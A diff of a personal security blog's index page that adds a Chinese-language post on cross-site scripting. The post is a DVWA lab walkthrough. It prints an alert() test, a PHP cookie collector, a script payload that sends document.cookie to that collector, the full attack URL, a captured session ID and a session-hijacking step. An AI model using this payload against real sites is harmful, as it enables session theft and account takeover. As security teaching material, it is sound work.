@@ -71,6 +71,69 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-XSS" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/08/01/XSS/" class="article-date">
+  <time class="dt-published" datetime="2021-08-01T15:53:54.187Z" itemprop="datePublished">2021-08-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>xss即Cross-site scripting(跨站脚本)，是一种客户端代码注入，通常注入代码时JavaScript，区别于命令注入，SQL注入等服务端代码注入。当用户访问被XSS脚本注入的网页，XSS代码就会被用户浏览器解析，从而达到攻击的目的。也就是说，XSS的对象时用户和浏览器。</p>
+<ul>
+<li>存储型XSS</li>
+</ul>
+<p>攻击代码在数据库里，输出在HTTP响应中</p>
+<ul>
+<li>反射性XSS</li>
+</ul>
+<p>攻击代码在url里，输出在HTTP响应中</p>
+<ul>
+<li>DOM型XSS</li>
+</ul>
+<p>攻击代码在url里，输出在DOM节点中</p>
+<p>反射性XSS</p>
+<h5 id="弹窗测试"><a href="#弹窗测试" class="headerlink" title="弹窗测试"></a>弹窗测试</h5><p>提交<script>alert(/xss/)</script>，出现弹窗，成功注入，说明存在xss漏洞</p>
+<p>  弹窗函数：alert()、confirm()、prompt()</p>
+<h4 id="整体攻击思路"><a href="#整体攻击思路" class="headerlink" title="整体攻击思路"></a>整体攻击思路</h4><p><img src="D:\blog范本\XSS攻击思路.PNG" alt="XSS攻击思路"></p>
+<p>攻击者web设计</p>
+<p>构建<a target="_blank" rel="noopener" href="http://127.0.0.1/cookie.php%E6%96%87%E4%BB%B6">http://127.0.0.1/cookie.php文件</a></p>
+<p>内容：</p>
+<?php
+$cookie = $_GET[ 'cookie'];file_put_contents('cookie.txt',$cookie);
+?>
+
+<p>构造攻击js</p>
+<script>document.location='http://127.0.0.1/cookie.php?cookie='+document.cookie;</script>
+
+<p>构造并发送攻击url</p>
+<p><a target="_blank" rel="noopener" href="http://10.240.138.212/DVWA-1.9/vulnerabilities/xss_r/?name=">http://10.240.138.212/DVWA-1.9/vulnerabilities/xss_r/?name=</a><script>document.location='<a target="_blank" rel="noopener" href="http://127.0.0.1/cookie.php?cookie=&#39;+document.cookie">http://127.0.0.1/cookie.php?cookie=&#39;+document.cookie</a>;</script>同时需要对参数进行url编码</p>
+<p>获得cookie</p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/cookie.txt">http://127.0.0.1/cookie.txt</a></p>
+<p>内容：</p>
+<p>security=low;<br>PHPSESSID=tkgm1hqifl8du9rdkdge7ba0c2</p>
+<p>劫持会话</p>
+<p>进行cookie编辑，直接访问index.php，成功进入DVWA.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://kkkylin12.github.io/2021/08/01/XSS/" data-id="ckrtdvvhg0000fwub76ftgyyc" data-title="" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-SQL盲注" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/08/01/SQL%E7%9B%B2%E6%B3%A8/" class="article-date">
@@ -347,6 +410,10 @@
     <h3 class="widget-title">Recent Posts</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2021/08/01/XSS/">(no title)</a>
+          </li>
         
           <li>
             <a href="/2021/08/01/SQL%E7%9B%B2%E6%B3%A8/">(no title)</a>
